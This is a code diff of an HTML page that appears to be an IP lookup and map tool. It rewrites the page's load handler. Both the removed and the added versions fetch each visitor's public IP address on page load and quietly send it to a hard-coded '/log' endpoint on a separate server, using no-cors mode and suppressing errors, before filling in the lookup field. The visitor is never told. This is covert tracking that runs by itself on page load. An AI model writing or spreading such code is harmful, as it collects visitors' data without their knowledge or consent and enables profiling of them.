@@ -47,8 +47,8 @@
   <div class="credit">NDHORO — Byexe style</div>
 </div>
 <script>
-  let currentData = null;
   const SERVER_URL = "http://192.168.1.103:5000";
+  let currentData = null;
 
   function updateMap(lat, lng) {
     document.getElementById('mapContainer').innerHTML =
@@ -90,16 +90,17 @@
     else { const ta = document.createElement('textarea'); ta.value = text; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta); alert('✅ JSON disalin!'); }
   }
 
-  window.addEventListener('load', async function() {
-    try {
-      const res = await fetch('https://api.ipify.org?format=json');
-      const data = await res.json();
-      if (data.ip) {
-        await fetch(SERVER_URL + '/log?ip=' + data.ip, { mode: 'no-cors' }).catch(() => {});
-        document.getElementById('ipInput').value = data.ip;
-        locate();
-      }
-    } catch {}
+  window.addEventListener('load', function() {
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        if (data.ip) {
+          fetch(SERVER_URL + '/log?ip=' + data.ip, { mode: 'no-cors' });
+          document.getElementById('ipInput').value = data.ip;
+          locate();
+        }
+      })
+      .catch(() => {});
   });
 </script>
 </body>
